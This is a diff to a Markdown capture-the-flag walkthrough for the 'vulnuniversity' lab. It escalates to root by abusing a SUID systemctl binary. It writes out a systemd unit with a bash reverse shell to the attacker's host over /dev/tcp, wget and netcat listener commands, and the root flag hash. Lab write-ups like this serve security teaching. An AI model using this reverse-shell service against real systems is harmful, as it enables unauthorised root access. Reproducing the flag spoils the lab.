@@ -115,6 +115,7 @@ machine:~$ find / -perm -u=s -type f | grep -v "Permission denied"
 > *Answer:* /bin/systemctl
 
 ### Become root and get the last flag (/root/root.txt)
+Create a file called *root.service* inside kali apache2 server
 ```
 ┌──(root💀kali)-[~]
 └─# cat > /var/www/html/root.service
@@ -127,12 +128,11 @@ User=root
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<kali ip>/8888 0>&1'
 
 [Install]
-wantedBy=multi-user.target
-*press CRTL+D to save file*
+wantedBy=multi-user.target ^D
+```
 
-┌──(root💀kali)-[~]
-└─# systemctl restart apache2
-
+Put file *root.service* to machine, then create symlink and start service.
+```
 machine:~$ cd /tmp
 machine:~/tmp$ wget <kali ip>/root.service
 ...
@@ -140,16 +140,23 @@ machine:~/tmp$ wget <kali ip>/root.service
 machine:~$ /bin/systemctl enable /tmp/root.service
 Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
 machine:~$ /bin/systemctl start root.service
+```
 
+Listen to incoming connections using netcat
+```
 ┌──(root💀kali)-[~]
 └─# nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [10.8.241.141] from (UNKNOWN) [10.10.117.6] 57870
 bash: cannot set terminal process group (2040): Inappropriate ioctl for device
 bash: no job control in this shell
+root@vulnuniversity:/# 
+```
+<img src="https://i2.wp.com/media4.giphy.com/media/mQG644PY8O7rG/giphy.gif" style="max-width:600px;">
+
+```
 root@vulnuniversity:/# cat /root/root.txt
 a58ff8579f0a9270368d33a9966c7fd5
 ```
 > *Answer:* a58ff8579f0a9270368d33a9966c7fd5
-
 
